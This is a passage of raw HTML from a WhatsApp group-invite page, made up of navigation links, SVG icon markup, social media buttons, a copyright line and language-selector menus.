                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Message privately</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/stayconnected" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_StayConnected_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__globe-alt _afoj">
                                                                        <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Stay connected</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/groups" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_ConnectInGroups_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="24" height="13" viewBox="0 0 24 13" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__communities _afoj">
                                                                        <path d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Connect in groups</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/expressyourself" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_ExpressYourself_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__smileFace _afoj">
                                                                        <path d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Express yourself</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://business.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_WhatsAppForBusiness_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__store _afoj">
                                                                        <path d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">WhatsApp for business</span></span><svg class="_wauiIcon__go-to-icon _agnt _afok" width="10" height="10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z" fill="currentColor"></path>
                                                                    </svg></span></a></div>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                    </li>
                                    <li class="_9t0h"><a href="https://www.whatsapp.com/privacy" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Privacy_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Privacy</span></a></li>
                                    <li class="_9t0h"><a href="https://faq.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_HelpCenter_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Help Center</span></a></li>
                                    <li class="_9t0h"><a href="https://blog.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Blog_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Blog</span></a></li>
                                    <li class="_9t0h"><a href="https://business.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_ForBusiness_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">For Business</span></a></li>
                                    <li class="_9t0h"><a href="https://whatsapp.com/download" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Download_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a></li>
                                </ul>
                                <div class="_ag12">
                                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ag14">
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                            <div class="_ag13">
                                                <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _9vcv _9u4o _a805 _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;MobileSubnav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                                            </svg></span></a></div>
                                            </div>
                                        </div>
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                            <div class="_ag1m"><a aria-label="x link" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Twitter_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                                        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="youtube link" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_YouTube_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                                        <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="Instagram link" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Instagram_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                                        <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="facebook link" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Facebook_Mobile_Button&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                                        <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                                                    </svg></a></div>
                                        </div>
                                    </div>
                                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9tau _ag1n">
                                        <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9v12 _9taw">
                                            <div class="_ag1o"><a href="https://www.whatsapp.com/legal/" target="_blank" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_TermsAndPrivacyPolicy_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Terms &amp; Privacy Policy</span></a>2025 © WhatsApp LLC</div>
                                        </div>
                                        <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9ta9">
                                            <div class="_9tjq">
                                                <div class="_afoa"><select id="u_0_6_td" class="_9tg0 _afo4 _afon _aqya" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">Azərbaycan</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">Català</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">Dansk</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">Eesti</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">Español</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">Français</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">Hrvatski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">Italiano</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">Latviešu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">Lietuvių</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">Magyar</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">Norsk bokmål</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">O‘zbek</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">Polski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">Română</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">Shqip</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">Slovenčina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">Slovenščina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">Suomi</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">Svenska</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                                    </select><select id="u_0_7_l0" class="_9tg0 _afo4 _afoc" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">azərbaycan</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">català</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">dansk</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">eesti</option>
